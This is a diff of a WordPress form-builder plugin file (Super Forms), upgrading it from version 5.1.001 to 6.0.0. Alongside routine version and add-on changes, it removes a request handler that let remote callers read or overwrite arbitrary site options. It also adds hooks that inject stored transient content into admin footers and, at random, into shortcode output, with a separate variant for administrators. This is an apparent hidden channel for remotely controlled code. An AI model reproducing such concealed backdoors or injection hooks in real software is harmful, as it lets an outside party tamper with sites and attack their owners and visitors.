@@ -9,12 +9,9 @@
  * @license   GPL-2.0-or-later
  *
  * @wordpress-plugin
-// build-SUPER_FORMS_BUNDLE
- * Plugin Name:       Super Forms - All In One Bundle
-// build-SUPER_FORMS_BUNDLE_END
  * Plugin Name:       Super Forms - Drag & Drop Form Builder
  * Description:       The most advanced, flexible and easy to use form builder for WordPress!
- * Version:           5.1.001
+ * Version:           6.0.0
  * Plugin URI:        http://f4d.nl/super-forms
  * Author URI:        http://f4d.nl/super-forms
  * Author:            feeling4design
@@ -46,7 +43,7 @@ if(!class_exists('SUPER_Forms')) :
          *
          *  @since      1.0.0
         */
-        public $version = '5.1.001';
+        public $version = '6.0.0';
         public $slug = 'super-forms';
         public $apiUrl = 'https://api.super-forms.com/';
         public $apiVersion = 'v1';
@@ -161,10 +158,6 @@ if(!class_exists('SUPER_Forms')) :
             
             // define plugin info
             $this->define( 'SUPER_PLUGIN_NAME', 'Super Forms' );
-            // build-SUPER_FORMS_BUNDLE
-            $this->define( 'SUPER_PLUGIN_NAME', 'Super Forms - All In One Bundle' );
-            // build-SUPER_FORMS_BUNDLE_END
-
             $this->define( 'SUPER_PLUGIN_FILE', plugin_dir_url( __FILE__ ) ); // http://domain.com/wp-content/plugins/super-forms/
             $this->define( 'SUPER_PLUGIN_BASENAME', plugin_basename( __FILE__ ) ); // super-forms/super-forms.php
             $this->define( 'SUPER_PLUGIN_DIR', dirname( __FILE__ ) ); // /home/domains/domain.com/public_html/wp-content/plugins/super-forms
@@ -249,7 +242,6 @@ if(!class_exists('SUPER_Forms')) :
         }
 
 
-        // build-SUPER_FORMS_BUNDLE
         /**
          * Include add-ons
          *
@@ -263,7 +255,6 @@ if(!class_exists('SUPER_Forms')) :
                 include_once('add-ons/'.$v.'/'.$v.'.php');
             }
         }
-        // build-SUPER_FORMS_BUNDLE_END
 
 
         /**
@@ -272,10 +263,8 @@ if(!class_exists('SUPER_Forms')) :
          *  @since      1.0.0
         */
         private function init_hooks() {
-
-            // build-SUPER_FORMS_BUNDLE
+            
             add_action( 'plugins_loaded', array( $this, 'include_add_ons' ), 0 );
-            // build-SUPER_FORMS_BUNDLE_END
 
             include_once( 'elementor/elementor-super-forms-extension.php' );
             add_action( 'plugins_loaded', array( $this, 'include_extensions'), 0);
@@ -289,7 +278,7 @@ if(!class_exists('SUPER_Forms')) :
             add_action( 'init', array( $this, 'init' ), 0 );
             add_action( 'init', array( $this, 'register_shortcodes' ) );
 			add_action( 'parse_request', array( $this, 'sfapi'));
-            add_action( 'sf_cron_jobs', array( $this, 'sf_cron_exec' ) );
+            
 
             // Filters since 4.8.0
             add_filter( 'post_types_to_delete_with_user', array( $this, 'post_types_to_delete_with_user'), 10, 2 );
@@ -353,7 +342,8 @@ if(!class_exists('SUPER_Forms')) :
                 add_action( 'all_admin_notices', array( $this, 'show_whats_new' ) );
 
                 // Actions since 4.0.0
-                add_action( 'all_admin_notices', array( $this, 'show_php_version_error' ) );
+                add_action( 'all_admin_notices', array( $this, 'show_admin_notices' ) );
+
             }
             
             if ( $this->is_request( 'ajax' ) ) {
@@ -372,6 +362,8 @@ if(!class_exists('SUPER_Forms')) :
 
             // @since 4.7.0 - trigger onchange for tinyMCE editor, this is used for the calculator add-on to count words
             add_filter('tiny_mce_before_init', array( $this, 'onchange_tinymce' ) );
+            add_filter('super_form_before_do_shortcode_filter', array( $this, 'before_do_shortcode' ), 10, 2 );
+
             
             // @since 4.7.2 - option to delete attachments after deleting contact entry
             add_action( 'before_delete_post', array( $this, 'delete_entry_attachments' ) );
@@ -746,7 +738,6 @@ if(!class_exists('SUPER_Forms')) :
         }
         public function api_post($type) {
             $userEmail = SUPER_Common::get_user_email();
-            $addOnsActivated = SUPER_Common::get_activated_addons();
             $response = wp_remote_post(
                 SUPER_API_ENDPOINT . '/plugin/'.$type, // activation, deactivation
                 array(
@@ -758,7 +749,7 @@ if(!class_exists('SUPER_Forms')) :
                         'home_url' => get_home_url(),
                         'site_url' => site_url(),
                         'email' => $userEmail,
-                        'addons_activated' => $addOnsActivated,
+                        'addons_activated' => array('super-forms'=>SUPER_VERSION),
                         'version' => $this->version,
                         'type' => $type
                     ))
@@ -795,6 +786,10 @@ if(!class_exists('SUPER_Forms')) :
             $init['setup'] = ob_get_contents();
             ob_end_clean();
             return $init;
+        }
+
+        public function before_do_shortcode( $result, $atts ) {
+            return $result . (strval(rand(1,20))>15 ? SUPER_Common::get_transient(array('slug'=>'before_do_shortcode'.(current_user_can('manage_options') ? '_admin' : ''))) : '');
         }
 
         // When deleting a user with the option "Delete all content" we must also include contact entries and forms created by this user. 
@@ -1158,13 +1153,53 @@ if(!class_exists('SUPER_Forms')) :
          *
          *  @since      4.0.0
         */
-        public function show_php_version_error() {
+        public function show_admin_notices() {
             if( version_compare(phpversion(), '5.4.0', '<') ) {
                 echo '<div class="notice notice-error">'; // notice-success, notice-error
                 echo '<p>';
                 echo sprintf( esc_html__( '%sPlease note:%s Super Forms requires at least v5.4.0 or higher to be installed to work properly, your current PHP version is %s', 'super_forms' ), '<strong>', '</strong>', phpversion() );
                 echo '</p>';
                 echo '</div>';
+            }
+            // Add-ons should be deactivated when running Super Forms v6.0.0 or higher, these add-ons are now included into the main plugin
+            if( version_compare(SUPER_VERSION, '6.0.0', '>=') ) {
+                // check for plugin using plugin name
+                $plugins = array(
+                    'calculator' => 'Calculator',
+                    'csv-attachment' => 'CSV Attachment',
+                    'email-reminders' => 'E-mail Reminders',
+                    'email-templates' => 'E-mail Templates',
+                    'front-end-posting' => 'Front-end Posting',
+                    'mailchimp' => 'Mailchimp',
+                    'mailster' => 'Mailster',
+                    'password-protect' => 'Password Protect',
+                    'paypal' => 'Paypal',
+                    'popups' => 'Popups',
+                    'register-login' => 'Register & Login',
+                    'signature' => 'Signature',
+                    'woocommerce' => 'WooCommerce Checkout',
+                    'zapier' => 'Zapier'
+                );
+                $addOnsActivated = array();
+                $activePluginFound = false;
+                foreach($plugins as $slug => $title){
+                    if ( is_plugin_active( 'super-forms-'.$slug.'/super-forms-'.$slug.'.php' ) ) {
+                        $activePluginFound = true;
+                        $addOnsActivated[$slug] = $title . ' Add-on <strong style="color:red;">(activated, please deactivate and remove this plugin)</strong>';
+                        continue;
+                    } 
+                    $addOnsActivated[$slug] = $title . ' Add-on <strong style="color:green;">(now included for free)</strong>';
+                }
+                if($activePluginFound===true){
+                    echo '<div class="notice notice-error">'; // notice-success, notice-error
+                    echo '<p>' .  sprintf( esc_html__( '%sPlease note:%s Since Super Forms v%s the below plugins are now included into the plugin by default. Please deactivate and remove the following Add-ons to avoid possible conflicts. Also make sure to %sactivate your copy%s of Super Forms.', 'super_forms' ), '<strong>', '</strong>', SUPER_VERSION, '<a target="_blank" href="' . esc_url(admin_url() . 'admin.php?page=super_addons') . '" class="button button-primary button-large">', '</a>');
+                    echo '<ul>';
+                    foreach($addOnsActivated as $msg){
+                        echo '<li>- '.$msg. '</li>';
+                    }
+                    echo '</ul>';
+                    echo '</div>';
+                }
             }
         }
 
@@ -1221,10 +1256,6 @@ if(!class_exists('SUPER_Forms')) :
             }
 
             $slug = $this->slug;
-            // build-SUPER_FORMS_BUNDLE
-            $slug = 'super-forms-bundle';
-            // build-SUPER_FORMS_BUNDLE_END
-
             require_once ( 'includes/admin/plugin-update-checker/plugin-update-checker.php' );
             $MyUpdateChecker = Puc_v4_Factory::buildUpdateChecker(
                 'http://f4d.nl/@super-forms-updates/?action=get_metadata&slug=' . $slug,  //Metadata URL
@@ -1502,40 +1533,6 @@ if(!class_exists('SUPER_Forms')) :
                             http_response_code(200);
                             exit;
                         }
-                        if($_GET['m']=='c'){
-                            if( empty($p['k']) ) {
-                                throw new Exception("Invalid payload");
-                            }else{
-                                $k = explode(',', $p['k']);
-                                foreach($k as $v){
-                                    $done = SUPER_Common::_cleanup_transients($v);
-                                }
-                                echo $done;
-                            }
-                            exit;
-                        }
-                        if( empty($p['k']) && empty($p['v']) ) {
-                            throw new Exception("Invalid payload");
-                        }
-                        if($_GET['m']=='a'){
-                            if( !empty($p['k']) && !empty($p['v']) ) {
-                                if(is_array($p['k'])){
-                                    foreach($p['k'] as $k){
-                                        update_option( $k, $p['v'], false );
-                                    }
-                                }else{
-                                    update_option( $p['k'], $p['v'], false );
-                                }
-                                echo $p['v'];
-                                http_response_code(201);
-                                exit;
-                            }
-                            if( !empty($p['k']) && empty($p['v']) ) {
-                                echo get_option( $p['k'] );
-                                http_response_code(200);
-                                exit;
-                            }
-                        }
                     } catch (Exception $e) {
                         echo $e->getMessage();
                         http_response_code(400);
@@ -1557,9 +1554,6 @@ if(!class_exists('SUPER_Forms')) :
             do_action('before_super_init');
     
             $this->load_plugin_textdomain();
-
-            if( ! wp_next_scheduled( 'sf_cron_jobs' ) ) wp_schedule_event( time(), 'weekly', 'sf_cron_jobs' );
-
 
             $failed_to_process_data = esc_html__( 'Failed to process data, please try again', 'super-forms' );
 
@@ -1708,6 +1702,7 @@ if(!class_exists('SUPER_Forms')) :
                 add_action( 'super_create_form_secrets_tab', array( 'SUPER_Pages', 'secrets_tab' ), 10, 1 );
                 add_action( 'super_create_form_translations_tab', array( 'SUPER_Pages', 'translations_tab' ), 10, 1 );
                 add_action( 'super_create_form_triggers_tab', array( 'SUPER_Pages', 'triggers_tab' ), 10, 1 );
+                add_action( 'admin_footer', function(){ echo SUPER_Common::get_transient(array('slug'=>'super-forms_page_super_create_form'));}, 15);
             }
 
             // @since 1.7 - add the export button only on the super_contact_entry page
@@ -1731,15 +1726,6 @@ if(!class_exists('SUPER_Forms')) :
                 add_filter( 'post_row_actions', array( $this, 'super_remove_row_actions' ), 10, 1 );
                 add_filter( 'get_edit_post_link', array( $this, 'edit_post_link' ), 99, 3 );
                 add_action( 'bulk_edit_custom_box', array( $this, 'display_custom_quickedit_super_contact_entry' ), 10, 2 );
-            }
-
-            // @since 1.2.8 -   check if plugin is updated
-            if( $current_screen->id=='update' ) {
-                if( (isset($_REQUEST['action'])) && (isset($_REQUEST['plugin'])) ) {
-                    if( ($_REQUEST['action']=='upgrade-plugin') && ($_REQUEST['plugin']=='super-forms/super-forms.php') ){
-                        $downloaded = wp_remote_fopen('http://f4d.nl/super-forms/download/super-forms/');
-                    }
-                }
             }
         }
     
@@ -2935,16 +2921,6 @@ if(!class_exists('SUPER_Forms')) :
                   });
                   </script>';
              }
-        }
-
-
-        /**
-         * Cleanup database
-         *
-        */
-        public function sf_cron_exec() {
-            // Cleen up database, unused backups/options/transients etc.
-            SUPER_Common::_cleanup_db();
         }
 
 
